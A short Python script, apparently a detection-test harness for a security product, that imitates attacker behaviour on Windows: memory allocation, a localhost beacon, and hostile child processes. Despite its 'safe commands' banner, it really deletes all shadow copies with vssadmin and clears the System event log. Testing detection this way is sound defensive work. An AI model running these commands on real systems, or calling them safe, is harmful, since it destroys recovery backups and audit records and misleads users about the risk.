import subprocess, urllib.request, time, ctypes
from colorama import Fore, init
init(autoreset=True)

print(f"{Fore.MAGENTA}--- AEGIS PRO: LIVE KINETIC FIRE SIMULATOR ---")
print(f"{Fore.LIGHTBLACK_EX}This script does NOT use the API. It executes safe commands on the host OS")
print(f"{Fore.LIGHTBLACK_EX}to prove the background OS and Network Sensors are capturing telemetry.\n")

def simulate_suspicious_memory():
    print(f"{Fore.YELLOW}[*] Allocating PAGE_EXECUTE_READWRITE memory...")
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE = 0x1000, 0x2000, 0x40
    kernel32 = ctypes.windll.kernel32
    ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(1024), ctypes.c_int(MEM_COMMIT | MEM_RESERVE), ctypes.c_int(PAGE_EXECUTE_READWRITE))
    if ptr:
        kernel32.VirtualFree(ctypes.c_void_p(ptr), ctypes.c_int(0), ctypes.c_int(0x8000))
        print(f"    {Fore.GREEN}-> Memory allocated and freed successfully.")

def simulate_recon():
    print(f"\n{Fore.YELLOW}[*] Spawning hostile child processes (Deterministic Killshots)...")
    commands = [
        "vssadmin.exe delete shadows /all /quiet", 
        "wevtutil.exe cl System",                   
        "powershell.exe -nop -w hidden -EncodedCommand UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANgAwADAA"
    ]
    for cmd in commands:
        print(f"    {Fore.CYAN}-> Executing: {cmd.split()[0]}")
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1)

def simulate_beacon():
    print(f"\n{Fore.YELLOW}[*] Simulating C2 beacon (Mechanical Rhythm)...")
    url = "http://127.0.0.1:4444/heartbeat"
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'}
    for i in range(4):
        print(f"    {Fore.CYAN}-> Sending Beacon {i+1}/4...")
        try:
            req = urllib.request.Request(url, headers=headers)
            urllib.request.urlopen(req, timeout=1)
        except Exception: pass
        time.sleep(2.0) 

if __name__ == "__main__":
    simulate_recon()
    simulate_suspicious_memory()
    simulate_beacon()
    print(f"\n{Fore.GREEN}[+] Kinetic sequence complete. Check the Aegis Dashboard.")